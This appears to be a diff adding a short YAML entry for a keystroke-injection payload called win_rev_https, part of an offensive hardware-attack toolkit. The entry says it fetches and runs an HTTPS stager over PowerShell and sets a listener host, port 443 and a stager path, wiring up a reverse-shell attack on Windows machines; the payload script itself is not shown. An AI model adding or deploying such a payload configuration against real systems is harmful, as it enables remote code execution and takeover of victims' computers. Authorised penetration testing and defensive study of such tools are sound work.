@@ -1,0 +1,8 @@
+name: win_rev_https
+group: hid
+summary: Fetch and run your HTTPS stager over PowerShell
+script: payloads/hid/win_rev_https.py
+env:
+  P4WN_LHOST: "10.0.0.1"
+  P4WN_LPORT: "443"
+  P4WN_URI: "/payloads/stager.ps1"
